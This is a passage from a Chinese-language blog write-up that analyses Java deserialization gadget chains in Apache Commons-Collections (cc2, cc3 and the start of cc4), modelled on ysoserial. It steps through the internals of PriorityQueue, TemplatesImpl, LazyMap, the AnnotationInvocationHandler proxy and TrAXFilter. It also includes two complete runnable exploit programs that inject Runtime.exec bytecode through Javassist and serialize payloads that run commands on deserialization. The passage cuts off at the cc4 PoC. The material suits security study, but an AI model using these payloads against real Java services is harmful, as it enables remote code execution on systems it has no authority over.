title="一些细节"></a>一些细节</h4><ol><li><p>为什么恶意类要继承AbstractTranslet？</p><p>因为TemplatesImpl的defineTransletClasses方法中有个判断，如果当前恶意类的父类不是AbstractTranslet的话，<code>_tranletIndecx</code>的值就是初始值-1。但是对于我们，class[0]就是我们的恶意类的Class对象，后续的newInstance离不开它，所以我们当然希望<code>_tranletIndex</code>的值就是0。</p></li></ol><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514163650043.png" alt="image-20210514163650043"></p><p>为什么<code>_tranletIndex</code>的值一定要是0呢？？？因为我们可以看到在TemplatesImpl的getTransletInstance中：<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514164219670.png" alt="image-20210514164219670"></p><p><code>_transletIndex</code>决定了<code>_class</code>数组的检索位置。</p><ol start="2"><li>为什么<code>_name</code>和<code>_class</code>属性要为null？</li></ol><p>因为在getTransletClasses中，只有满足这两个方法，才能进入defineTransletClasses：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514164740087.png" alt="image-20210514164740087"></p><ol start="3"><li>为什么要改<code>size</code>的值？</li></ol><p>因为在heapify()中：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514165822726.png" alt="image-20210514165822726"></p><p>PriorityQueue的size属性默认是0，在这就会断掉。</p><ol start="4"><li>为什么不能直接给PriorityQueue的queue属性去赋值？非要用反射？</li></ol><p>queue的值其实会在compare中当作参数，所以一定要有值。</p><p>不能直接赋值是因为：</p><p>抛开queue属性是private transient Object[] queue;</p><p>queue属性以及其长度都是初始化时候得到的</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514172000161.png" alt="image-20210514172000161"></p><p>好的现在如果是queue.add()的话：</p><p>只改一个地方：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514172637366.png" alt="image-20210514172637366"></p><p>(其实这里面只add一次tmpl也是可以的)</p><p>第一次是2，他会先进行一个自动装箱，变成new Integer(2)，因为PriorityQueue接受Obejct泛型。</p><p>第一次由于size是初始值0，所以只是老实的进入queue[0]，size变成1</p><p>第二次由于是i=size，目前size是1，会进入siftUp函数</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514173317035.png" alt="image-20210514173317035"></p><p>然后进入siftUpUsingComparator：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514173453769.png" alt="image-20210514173453769"></p><p>这里多说几句，可以看到k，x两个参数1和tmpl</p><p>parent是0，e=queue[1]也就是Integer(1)</p><p>接下来会进入comparator的compare方法；</p><p>来到第一个tranform：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514173727496.png" alt="image-20210514173727496"></p><p>仔细看的话可以看出来obj1是上面siftUpUsingComparator函数的第二个函数x也就是Tmpl，obj2是上面的e，就是第一次传进去的值2</p><p><strong>这里就会提前触发调用链，利用失败。</strong></p><p>多说一句，就算绕过这里，在第三行this.decorated.compare语句又会走向哪里？</p><p>我们当前传进来的comparator采用的是第一个构造函数，只有一个InvokerTransformer[]</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514174908649.png" alt="image-20210514174908649"></p><p>这里面第二个参数是什么？</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514174938291.png" alt="image-20210514174938291"></p><p>再点进去发现是包装类的compareTo方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514175531065.png" alt="image-20210514175531065"></p><p>那就没事了。</p><p>现在可以回答这个问题了，因为<strong>会提前触发利用链</strong>，并且value1和value2的分别是两次transform的值，如果类型相同，是会走到这里的。</p><ol start="5"><li>第一个传进去的tmpl在哪里用到了？</li></ol><p>跟一遍，会发现在compare这里传进去了，给了transform：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514180443283.png" alt="image-20210514180443283"></p><ol start="6"><li><p>细心的你会发现，PriorityQueue的queue这个属性是transient的，为什么还能序列化成功？</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514180903833.png" alt="image-20210514180903833"></p></li></ol><p>queue本身作为transient属性，讲道理是不能写入到序列化的二进制文件中的。</p><p>是因为在PriorityQueue的writeObject方法中：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514181212114.png" alt="image-20210514181212114"></p><p>他先拿到流，然后把queue的内容循环的写入到流中，这样就被保存了下来。</p><h4 id="最终版本PoC-3"><a href="#最终版本PoC-3" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.开始做InvokerTransformer 命名为iInvokerTransformer，需要借助它内部的invoke方法调用newTransformer方法</span></span><br><span class="line">        <span class="comment">//然后用TransformingComparator包装他，因为TransformingComparator的构造函数可以把iInvokerTransformer传递给自身transformer属性</span></span><br><span class="line">        InvokerTransformer iInvokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator iTransformingComparator = <span class="keyword">new</span> TransformingComparator(iInvokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray = <span class="keyword">new</span> Object[]&#123;tmpl, <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解封属性comparator, iTransformingComparator =&gt; _comparator</span></span><br><span class="line">        Field _comparator = PriorityQueue.class.getDeclaredField("comparator");</span><br><span class="line">        _comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _comparator.set(pq, iTransformingComparator);</span><br><span class="line">        <span class="comment">//解封属性queue，queueArray =&gt; _queue</span></span><br><span class="line">        Field _queue = PriorityQueue.class.getDeclaredField("queue");</span><br><span class="line">        _queue.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _queue.set(pq, queueArray);</span><br><span class="line">        <span class="comment">//size修改为2</span></span><br><span class="line">        Field _size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        _size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _size.set(pq, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc2_TemplatesImpl.ser"</span>)));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc2_TemplatesImpl.ser"</span>)));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cc3"><a href="#cc3" class="headerlink" title="cc3"></a>cc3</h2><p>条件：</p><ul><li><strong>commons-collections: 3.1～3.2.1</strong></li><li>jdk7u21之前</li></ul><p>cc3更像是cc1和cc2的缝合变体，借助了cc1的lazyMap+动态代理和cc2的newInstance。</p><h3 id="利用链寻找-3"><a href="#利用链寻找-3" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>如果我们先从后半段开始看，和cc2一样，我们的目标是执行TemplatesImpl的newTransformer方法来newInstance</p><p>cc2中我们知道，newTransformer方法属于TemplatesImpl类，更是Templates接口的方法，</p><p>我们需要寻找哪里调用了Templates.newTransformer方法</p><p>搜索一圈发现TrAXFilter这个类比较合适：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515111125775.png" alt="image-20210515111125775"></p><p>跟进去看，发现构造函数依赖Templates接口的参数，会调用参数的newTransformer方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515112530417.png" alt="image-20210515112530417"></p><p>所以现在，<strong>我们需要构造这个参数templates</strong></p><p>或者<strong>new 一个TrAXFilter类的实例</strong>也是可以的啊！ysoserial选择了后者</p><p>怎样可以new一个实例呢？</p><p>ysoserial找到了InstantiateTransformer，看看他的transform方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515104145715.png" alt="image-20210515104145715"></p><p>可以看到，这里面调用了input参数的调用方法，然后借助iParamTypes和iArgs实例化了一个对象出来。</p><p>我们还记得cc1中的Chain可以循环调用transform方法，我们让input是TrAXFilter类对象不就可以了么</p><p>所以这里还是得用到chain</p><p>有了chain，问题来到了哪里会调用chain的入口点呢也就是chain的第一个transform方法？</p><p>记得cc1的LazyMap么？他的get方法会调用transform，如果这里是chain不就美滋滋了么</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515134002101.png" alt="image-20210515134002101"></p><p>哪里可以调用lazyMap的get方法呢？</p><p>或许你还记得cc1的InvocationHandler的invoke会调用get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515145038750.png" alt="image-20210515145038750"></p><p>稳，现在就是怎么让memberValues参数是LazyMap类型呢？</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515145145356.png" alt="image-20210515145145356"></p><p>降维打击，<strong>动态代理</strong></p><p>我认为这里的思路一定是ysoserial的师傅们看到了AnnotationInvocationHandler既然是InvocationHandler的子类才想到。</p><p>假设现在有一个AnnotationInvocationHandler的类H</p><p>我们都知道，H要是想执行invoke方法，<strong>一定是H作为handler参与了一个动态代理类的实现</strong>。</p><p>我们假设上一句话提到的“一个动态代理类”是p，p调用了任何方法，都会交付给H的invoke去做。</p><p>同时我们还发现AnnotationInvocationHandler的readObject方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515151042914.png" alt="image-20210515151042914"></p><p>他可以对Map类型的属性memberValues执行entrySet方法</p><p>这里其实entrySet或者什么别的其实都不重要，重要的是<strong>发生了调用</strong></p><p>所以这里如果this,memberValues是一个LazyMap的代理类，那么这个代理类的handler的invoke方法就必将会执行。</p><p>所以我们上文提到的p，作为代理类，完全可以代理LazyMap类，handler配置为H就可以了</p><p>那么现在就是确定了我们的payload最外面是AnnotationInvocationHandler类，起名h2，我们要把h2.memberValues配置为一个动态代理，这里可以起名为mapProxy。</p><p>mapProxy目标是为了存放在h2.memberValues里，为了invoke。</p><p>mapProxy的handler位置需要设置为h1，这个h1也是AnnotationInvocationHandler类，h1.memberValues需要设置为LazyMap，为了LazyMap.get。</p><p>所以正常走下来就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h2.readObject() -&gt; h2.memberValues.xxx() -&gt; mapproxy.xxx() -&gt; h1.invoke() -&gt; h1.memberValues.get() -&gt; LazyMap.get()</span><br></pre></td></tr></table></figure><p>成功续命。</p><h3 id="调用链流程梳理"><a href="#调用链流程梳理" class="headerlink" title="调用链流程梳理"></a>调用链流程梳理</h3><p>正常进入AnnotationInvocationHandler的readObject方法，h2的memberValues属性就是mapProxy</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515133241920.png" alt="image-20210515133241920"></p><p>这里由于mapProxy是动态代理，所以只要调用就会调用handler的invoke方法，mapProxy的handler就是h1</p><p>h1也是AnnotationInvocationHandler类，所以会进入本类AnnotationInvocationHandler的invoke方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515133608739.png" alt="image-20210515133608739"></p><p>由于h1的memberValues属性是传进去的lazymap，所以会调用LazyMap的get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515134002101.png" alt="image-20210515134002101"></p><p>factory是chain，会进入chain的transform，接下里就很熟悉了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515134046605.png" alt="image-20210515134046605"></p><p>成环调用，chain中第一个是元素是<code>new ConstantTransformer(TrAXFilter.class),</code>所以看上面，第一个循环的object返回的就是TrAXFilter的类对象（get(key)参数被无情抛弃），重点是第二次，会进入InstantiateTransformer的transform方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515140301462.png" alt="image-20210515140301462"></p><p>这里面细说，input参数是第一次object对象也就是TrAXFilter.class类对象，iParamTypes属性就是外面构造好的Templates.class类对象，iArgs属性就是提前传进来的tmpl对象。</p><p>con方法是TrAXFilter类中，满足只有一个Templates接口参数的构造函数。</p><p>tmpl是TemplatesImpl类，会调用Templates接口的newInstance方法，参数是iArgs也就是tmpl。</p><p>所以这里会走到TrAXFilter类的构造函数：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515140852568.png" alt="image-20210515140852568"></p><p>导致触发！</p><h3 id="最终版本PoC-4"><a href="#最终版本PoC-4" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><p>PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrAXFilter_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造chain，封装进LazyMap</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">                        new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4. 拿到cons,先做一个h1，h1.memberValues = lazymap</span></span><br><span class="line">        <span class="keyword">final</span> Constructor cons = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler h1 = (InvocationHandler) cons.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">lazymap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理类实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),<span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(),<span class="title">h1</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例h2，并且把刚刚创建的代理赋值给h2.memberValues</span></span><br><span class="line">        InvocationHandler h2 = (InvocationHandler)cons.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc3_TrAXFilter.ser"</span>)));</span><br><span class="line">        fout.writeObject(h2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc3_TrAXFilter.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cc4"><a href="#cc4" class="headerlink" title="cc4"></a>cc4</h2><p>环境：</p><ul><li><strong>commons-collections4: 4.0</strong></li><li><strong>jdk7u21</strong>之前</li></ul><p>cc4是cc2和cc3的杂交体</p><p>前半段用了cc2的PriorityQueue以及TransformingComparator，TransformingComparator本来应该调用InvokeTransformer的transform方法的，但是因为InvokeTransformer被ban掉了，所以这里ysoserial用了cc3的chain，里面用的是InstantiateTransformer，用了InstantiateTransformer就必须要进行类实例的构造，也就和cc3后面一样了，也用了TrAXFilter来包装TemplatesImpl。</p><h3 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>cc2里面的前半部分可以一直走到TransformingComparator的transform方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516161059025.png" alt="image-20210516161059025"></p><p>在cc2里面，这里面的<code>this.transformer</code>是InvokerTransformer，但是在cc4里，我们需要换成chain来包装InstantiateTransformer，也就离不开后续TrAXFilter的newInstance了。</p><h3 id="最终版本PoC-5"><a href="#最终版本PoC-5" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 